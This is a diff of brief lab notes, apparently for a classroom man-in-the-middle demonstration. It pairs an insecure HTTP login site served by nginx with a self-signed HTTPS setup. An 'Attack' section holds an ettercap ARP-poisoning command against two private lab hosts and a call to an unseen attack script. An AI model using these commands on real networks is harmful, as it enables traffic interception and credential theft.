@@ -13,11 +13,35 @@ Webserver
 systemctl status nginx
 sudo systemctl restart nginx
 sudo nginx -t
-curl http://unsecure-login.com
+curl http://secure-login.com
 curl http://unsecure-login.com/submit?data=pwd-123
 
+sudo openssl genrsa -out /etc/ssl/private/secure-login.key 2048
+sudo openssl req -new -x509 \
+  -key /etc/ssl/private/secure-login.key \
+  -out /etc/ssl/certs/secure-login.crt \
+  -days 365
+
+ curl -k -L http://secure-login.com
 
 Attack
 sudo python3 /opt/tools/attack.py
 sudo ettercap -T -i eth0 -M arp:remote /192.168.50.20/ /192.168.50.40/
 poison whole server
+
+
+server {
+    listen 192.168.50.60:80;
+    server_name unsecure-login.com;
+
+    root /var/www/unsecure-login.com;
+    index unsecure-login.html;
+
+    location /submit {
+        return 200 "Submitted\n";
+    }
+    
+    location / {
+        try_files $uri $uri/ =404;
+    }
+}
